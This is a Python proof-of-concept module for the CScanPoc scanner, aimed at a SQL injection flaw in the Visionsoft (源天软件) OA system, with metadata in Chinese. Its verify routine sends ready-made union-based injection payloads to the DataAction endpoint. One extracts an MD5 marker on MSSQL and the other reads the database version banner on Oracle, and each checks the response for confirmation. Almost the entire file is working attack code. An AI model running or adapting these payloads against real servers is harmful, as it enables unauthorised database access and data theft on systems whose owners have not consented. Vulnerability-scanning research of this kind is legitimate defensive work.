# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'visionsoft_0000' # 平台漏洞编号，留空
    name = '源天软件OA通用型SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-25'  # 漏洞公布时间
    desc = '''
        源天软件OA通用型SQL注入漏洞(mssql and Oracle)
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0128521' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'visionsoft'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'visionsoft_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #mssql
            url=arg+"/ServiceAction/com.velcro.base.DataAction?sql=|20select|20categoryids|20from|20project|20where|20id=%27%27%20and%201=2%20union%20all%20select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))&isworkflow=true"
            code,head,res,errcode,finalurl=hh.http(url)
            if code==200 and  "c4ca4238a0b923820dcc509a6f75849b"  in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            #Oracle   
            else:
                url=arg+"/ServiceAction/com.velcro.base.DataAction?sql=|20select|20categoryids|20from|20project|20where|20id=''%20and%201=2%20union%20all%20select%20(select%20banner%20from%20sys.v_$version%20where%20rownum=1)%20from%20dual&isworkflow=trueE）"
                code,head,res,errcode,finalurl=hh.http(url)
                if code==200 and  "Oracle Database"  in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()